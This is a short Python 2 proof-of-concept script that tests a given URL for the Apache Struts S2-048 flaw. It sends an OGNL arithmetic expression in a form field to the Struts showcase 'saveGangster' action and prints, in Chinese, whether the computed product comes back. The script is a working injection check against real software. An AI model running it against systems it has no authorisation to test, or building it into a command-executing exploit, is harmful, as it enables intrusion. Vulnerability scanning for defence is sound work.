# -*- coding:utf-8 -*-

import random
import requests
import sys


class POC:
    def __init__(self):
        try:
            self.url = sys.argv[1]
            self.verify()

        except Exception:
            print '''
            tip:
                python Struts-S2-048POC.py http://127.0.0.1:8080
            '''



    def verify(self):

        random_num_dict = random.randint(1, 2000)
        random_num_1 = random_num_dict
        random_num_2 = random_num_dict

        ss = requests.session()

        tmp_edit_path = "/integration/editGangster.action"
        tmp_path = "/integration/saveGangster.action"

        url = self.url+tmp_path

        header = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "1166",
            "Referer": self.url+tmp_edit_path
        }

        data = {
            "name": "${%s*%s}" % (random_num_1, random_num_2),
            "age": 123

        }

        try:
            ss.get(self.url+tmp_edit_path, timeout=10)

            cookie = ss.get(self.url+tmp_edit_path, timeout=10).cookies

            resp = ss.post(url,  headers=header, data=data, cookies=cookie, timeout=10)

            if str(random_num_1*random_num_2) in resp.content:
                print self.url + " 存在Struts S2-048漏洞"

            else:
                print self.url + " 不存在Struts S2-048漏洞"

        except Exception, e:
            print self.url + " 网络状态不好，或不存在Struts S2-048漏洞"

if __name__ == '__main__':
    POC()
